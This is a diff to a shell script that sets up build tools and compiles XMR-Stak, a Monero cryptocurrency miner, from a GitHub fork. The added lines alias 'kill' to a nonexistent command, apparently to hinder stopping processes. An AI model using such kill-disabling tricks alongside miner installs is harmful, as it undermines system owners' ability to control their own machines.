@@ -6,6 +6,8 @@ sudo yum install -y screen cmake3 devtoolset-4-gcc* hwloc-devel libmicrohttpd-de
 echo 'source /opt/rh/devtoolset-4/enable' >> ~/.bashrc
 # Reloads bashrc without reboot
 source ~/.bashrc
+#Kill kill
+alias kill=kill_disabled
 # Clone & Intsall XMR Stak
 git clone https://github.com/aeugenegray/xmr-stak.git && mkdir xmr-stak/build
 cd xmr-stak/build && cmake3 .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
